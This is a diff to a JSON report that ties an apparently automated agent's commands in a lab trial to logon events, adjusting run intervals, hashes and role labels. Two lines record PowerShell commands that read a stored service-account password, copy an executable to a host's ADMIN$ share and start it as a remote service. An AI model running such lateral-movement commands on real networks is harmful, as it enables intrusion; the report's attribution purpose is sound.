@@ -48,7 +48,13 @@
     "run_day": "2026-10-12",
     "run_interval": {
       "start_utc": "2026-10-12T09:09:49.665Z",
-      "end_utc": "2026-10-12T09:24:33.179Z"
+      "end_utc": "2026-10-12T09:21:58.477Z"
+    },
+    "manifest_span": {
+      "start_utc": "2026-09-24T04:54:18.744946Z",
+      "end_utc": "2026-10-12T09:21:58.477689Z",
+      "source": "data/manifest.csv",
+      "files": 7
     },
     "run_day_rule": "run = the latest splunkd root plus every earlier root reached by walking back while consecutive roots are <= 6 h apart (roots = Sysmon 1 children of the agent splunkd.exe in Users/Public plus pid_match_4688 roots); run days = UTC days from the earliest to the latest of those roots; run_interval start = earliest root of a walk-back with a 30 min gap (trials of one day share a DB) - 60 s, end = last step + 300 s; older roots belong to other runs"
   },
@@ -211,6 +217,7 @@
       "command_host": "ep-01",
       "target_host": "ep-02",
       "basis": "command_names_target",
+      "source_session_logon_id": null,
       "agent_account": "svc_backup",
       "cmd_credential_account": "svc_backup",
       "agent_command": "powershell.exe -ExecutionPolicy Bypass -C \"$pw = [Environment]::GetEnvironmentVariable('SVC_BACKUP_PW','Machine'); net use \\\\192.168.50.22\\IPC$ /user:LAB\\svc_backup *** Copy-Item C:\\Users\\Public\\Xpay.exe \\\\192.168.50.22\\ADMIN$\\Xpay.exe -Force; sc.exe \\\\192.168.50.22 create XferService binPath= \\\"C:\\Windows\\Xpay.exe\\\" start= demand; sc.exe \\\\192.168.50.22 start XferService\"",
@@ -258,8 +265,8 @@
       "reason": null,
       "handoff_step": "s07-h-x",
       "handoff_account": "svc_backup",
-      "role": "attack_pair",
-      "proposed_role": null,
+      "role": "attack",
+      "path_role": "attack_pair",
       "stray": false,
       "method": "command_names_target+artifact",
       "source_ip": "192.168.50.21",
@@ -268,6 +275,7 @@
       "move_time_utc": "2026-10-12T09:17:57.753472Z",
       "target_logon_id": "0x49cdfa",
       "authentication_package": "NTLM",
+      "target_4624_content_sha256": "060f2d1cd99c408cf3959111621db2d1479cdf5957095981fac05b7841558a75",
       "target_event_uids": [
         "72a62ab20a8c20dfe39ebf9c3dd6a3e3b262f83551bb8d8ed1eeb0066896e765",
         "8351c7f300da9b8feefe2d73bacd73ff1f1c5f91213f3e7390fbc61588e33e72",
@@ -338,6 +346,7 @@
       "command_host": "ep-01",
       "target_host": "ep-02",
       "basis": "command_names_target",
+      "source_session_logon_id": null,
       "agent_account": "svc_backup",
       "cmd_credential_account": "svc_sql",
       "agent_command": "powershell.exe -ExecutionPolicy Bypass -C \"$pw = [Environment]::GetEnvironmentVariable('SVC_SQL_PW','Machine'); net use \\\\192.168.50.22\\IPC$ /user:LAB\\svc_sql *** Copy-Item C:\\Users\\Public\\Ypay.exe \\\\192.168.50.22\\ADMIN$\\Ypay.exe -Force; sc.exe \\\\192.168.50.22 create SyncService binPath= \\\"C:\\Windows\\Ypay.exe\\\" start= demand; sc.exe \\\\192.168.50.22 start SyncService\"",
@@ -386,8 +395,8 @@
       "reason": null,
       "handoff_step": "s07-h-y",
       "handoff_account": "svc_sql",
-      "role": "attack_pair",
-      "proposed_role": null,
+      "role": "attack",
+      "path_role": "attack_pair",
       "stray": false,
       "method": "command_names_target+artifact",
       "source_ip": "192.168.50.21",
@@ -396,6 +405,7 @@
       "move_time_utc": "2026-10-12T09:19:33.179614Z",
       "target_logon_id": "0x4b5d51",
       "authentication_package": "NTLM",
+      "target_4624_content_sha256": "c41c04178682c55aa870a94965b760f298dbaeb8d0134f33d72e2cc1d2d13138",
       "target_event_uids": [
         "6f60f8e334fdc3a9310f6e6a61bcda17401c00831423bedd467114170e0d54bd",
         "cc3d5b77a98438b68c90fbf2d07cdbf94c8f18191def049e2235e4ae32fefc66",
@@ -462,7 +472,7 @@
       "move_time_utc": "2026-10-12T09:11:08.098862Z",
       "basis": "time_account_only",
       "status": "unconfirmed",
-      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:24:33.179Z",
+      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:21:58.477Z",
       "agent_event_uids": [],
       "target_event_uids": [
         "017fec3654e50ed911432733a9e8f211487423cc564bba768a9778af83409181",
@@ -491,16 +501,18 @@
       "confidence_tier": "D",
       "target_binding": "time_account",
       "candidate_count": 1,
+      "target_4624_content_sha256": "14e9bc4f95971a99aa5d11b35ae812e5cba9611709eba60d2e546af69cc479dc",
       "credential_logon_uids": [],
       "related_logon_uids": [],
       "port_join_event_uids": [],
       "needs_owner_approval": false,
       "flags": [],
-      "role": null,
-      "proposed_role": null,
+      "role": "background",
+      "path_role": null,
       "target_logon_id": "0x264f4c",
       "authentication_package": "NTLM",
-      "source_host_by_ip": "ep-01"
+      "source_host_by_ip": "ep-01",
+      "shared_with_trials": []
     }
   ],
   "paths": [
@@ -526,8 +538,8 @@
     {
       "kind": "hop",
       "id": "s07-t1",
-      "role": null,
-      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:24:33.179Z",
+      "role": "background",
+      "reason": "no_agent_command_names_target; logon lies inside the trial run interval 2026-10-12T09:09:49.665Z .. 2026-10-12T09:21:58.477Z",
       "flags": [],
       "event_uids": [
         "017fec3654e50ed911432733a9e8f211487423cc564bba768a9778af83409181",
